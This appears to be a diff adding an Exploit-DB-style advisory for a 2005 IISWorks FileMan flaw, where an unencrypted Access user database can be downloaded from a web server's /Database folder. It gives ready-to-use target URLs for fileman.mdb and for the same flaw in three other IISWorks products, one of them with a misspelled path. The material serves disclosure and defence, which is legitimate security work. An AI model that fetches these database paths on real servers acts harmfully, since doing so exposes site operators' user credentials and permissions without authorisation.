@@ -1,0 +1,48 @@
+# Exploit Title: IISWorks FileMan fileman.mdb Remote User Database
+Disclosure
+# Disclosure Date: July 5, 2005
+# Author: Known Vulnerability
+# Software Link: http://www.scriptdungeon.com/scripts/asp/FileManASP.rar
+# Version:
+# OSVDB: 17824
+# Security Tracker ID: 1014383
+# Found exploited in the wild by: Joey Furr (j0fer), Exploit-DB team
+# On: May 10, 2010
+# Found on: Windows Server 2003 Service Pack 2 version 5.2.3790
+
+
+[+] Description
+    IISWorks FileMan is an .asp-based web interface meant to simplify the
+    process of uploading, downloading, and otherwise managing files on a
+server.
+    The script uses an unencrypted Microsoft Access database file for user
+and
+    permissions administration.
+
+    * If 'Read' permissions are not revoked in IIS on the /Database folder,
+the user
+      db will be directly downloadable. The FileMan diags.asp installation
+verification
+      script does not check for this permission setting.
+
+[+] Usage
+
+http://[Target]/fileman/Database/fileman.mdb
+
+or
+
+http://[Target]/[InstallDir]/Database/fileman.mdb
+
+[+] Other Products from the same vendor with the same vulnerability
+
+IISWorks ListPics listpics.mdb Remote User Database Disclosure
+
+   http://[target]/gallery/Database/listpics.mdb
+
+IISWorks ASPKnowledgeBase kb.mdb Remote User Database Disclosure
+
+   http://[target]/KB/Databse/kb.mdb
+
+IISWorks ASPWebMail Webmail.mdb Remote User Database Disclosure
+
+   http://[target]/Webmail/Database/Webmail.mdb
